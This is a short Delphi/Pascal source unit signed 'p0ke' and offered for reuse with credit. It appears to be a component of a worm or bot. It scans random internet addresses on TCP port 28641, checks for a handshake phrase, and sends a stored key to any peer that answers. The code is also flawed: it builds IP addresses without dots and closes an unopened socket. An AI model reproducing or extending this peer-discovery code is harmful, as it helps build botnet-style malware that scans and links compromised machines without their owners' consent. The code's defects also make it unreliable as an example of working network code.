   (*  Please dont modify or anything, and credit me if use  *)
   (*                                                        *)
   (*     BBBBBB     LL         AAAAAAA                      *)
   (*     BB   BB    LL        AA     AA                     *)
   (*     BB   BB    LL        AA     AA                     *)
   (*     BBBBBB     LL        AA     AA                     *)
   (*     BB   BB    LL        AAAAAAAAAAAAAA                *)
   (*     BB   BB    LL        AA     AA  p0ke               *)
   (*     BBBBBB     LLLLLLL   AA     AA                     *)
   (*                                                        *)
   (*                                                        *)
   (*  Please dont modify or anything, and credit me if use  *)

   unit uLifeSearch;

   interface

   Uses
    Windows, Winsock;

   PROCEDURE FindLife;

   Var
     ThreadKey : String;

   implementation

   Function GetKey:String;
   Begin
     Result := ThreadKey;
   End;

   Procedure SendData(Str:String;Sock:TSocket);
   Begin
     Send(Sock,Str[1], Length(Str), 0);
   End;

   Function ReceiveData(Sock:TSocket):String;
   Var
     Buf:Array[0..36000]Of Char;
   Begin
     ZeroMemory(@Buf, SizeOf(Buf));
     If Recv(Sock, Buf, SizeOf(Buf), 0) < 1 Then
      Result := ''
     Else
      Result := Buf;
   End;

   Procedure FindLife;
   Var
    Sock             : TSocket;
    Wsadatas         : TWSADATA;
    SockAddrIn       : TSockAddrIn;
    Data             : String;
    IP               : String;
   Label
    Hello;
   Begin
    Hello:
    Randomize;
    Ip := IntToStr(Random(254));
    Ip := Ip + IntToStr(Random(254));
    Ip := Ip + IntToStr(Random(254));
    Ip := Ip + IntToStr(Random(254));
    CloseSocket(Sock);
    WSACleanUp;
    WSAStartUp(257,wsadatas);
    Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
    SockAddrIn.sin_family:=AF_INET;
    SockAddrIn.sin_port:=htons(28641);
    SockAddrIn.sin_addr.S_addr:=inet_addr(PChar(IP));
    If Connect(Sock,SockAddrIn,SizeOf(SockAddrIn)) = ERROR_SUCCESS Then Begin
     Data := ReceiveData(Sock);
     If Data <> '' Then Begin
      If Data = 'Who can resist coke?' Then Begin
        SendData(GetKey, Sock);
     End;
    End Else Begin
     Goto Hello;
    End;
   End;

   end.
